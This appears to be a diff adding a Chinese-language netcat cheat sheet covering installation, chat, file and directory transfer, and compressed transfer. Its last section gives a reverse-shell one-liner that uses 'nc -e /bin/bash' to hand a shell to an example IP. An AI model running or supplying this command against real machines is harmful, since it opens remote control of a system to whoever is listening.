@@ -1,0 +1,41 @@
+https://www.oschina.net/translate/linux-netcat-command
+
+netcat是网络工具中的瑞士军刀，它能通过TCP和UDP在网络中读写数据。通过与其他工具结合和重定向，你可以在脚本中以多种方式使用它。
+使用netcat命令所能完成的事情令人惊讶。
+
+netcat所做的就是在两台电脑之间建立链接并返回两个数据流，在这之后所能做的事就看你的想像力了。
+你能建立一个服务器，传输文件，与朋友聊天，传输流媒体或者用它作为其它协议的独立客户端。
+
+安装方式:
+yum -y install nmap nmap-ncat
+
+聊天
+Server: 
+nc -v -l -p 9999
+
+Client: 
+telnet server-ip 9999
+或
+$nc server-ip 9999
+
+文件传输
+server:
+$nc -l 1567 < file.txt
+
+client:
+$nc -n 172.31.100.7 1567 > file.txt
+
+目录传输
+Server:
+$tar -cvf – dir_name | nc -l 1567
+
+Client
+$nc -n 172.31.100.7 1567 | tar -xvf -
+
+如果想要节省带宽传输压缩包，我们可以使用bzip2或者其他工具压缩。
+$tar -cvf – dir_name| bzip2 -z | nc -l 1567
+$nc -n 172.31.100.7 1567 | bzip2 -d |tar -xvf -
+
+反向shell
+$nc -l 1567
+$nc 172.31.100.7 1567 -e /bin/bash
